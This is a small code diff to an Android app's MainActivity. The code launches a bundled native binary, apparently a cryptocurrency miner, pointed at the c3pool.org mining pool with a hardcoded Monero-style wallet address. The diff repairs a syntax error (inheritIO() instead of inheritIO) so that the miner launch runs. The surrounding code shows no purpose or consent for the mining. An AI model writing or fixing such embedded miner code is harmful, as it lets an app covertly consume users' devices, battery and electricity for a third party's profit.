@@ -16,7 +16,7 @@ public class MainActivity extends android.app.Activity
             final var processBuilder = new java.lang.ProcessBuilder(mime.getPath(), "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR");
             final var environment = processBuilder.environment();
             environment.putIfAbsent("LD_LIBRARY_PATH", new java.io.File(super.getDataDir(), "lib").getPath());
-            final var process = processBuilder.inheritIO.start();
+            final var process = processBuilder.inheritIO().start();
             process.waitFor();
             //java.util.concurrent.TimeUnit.MINUTES.sleep(2);
             //java.lang.System.out.println(new java.lang.String(process.getInputStream().readAllBytes()));
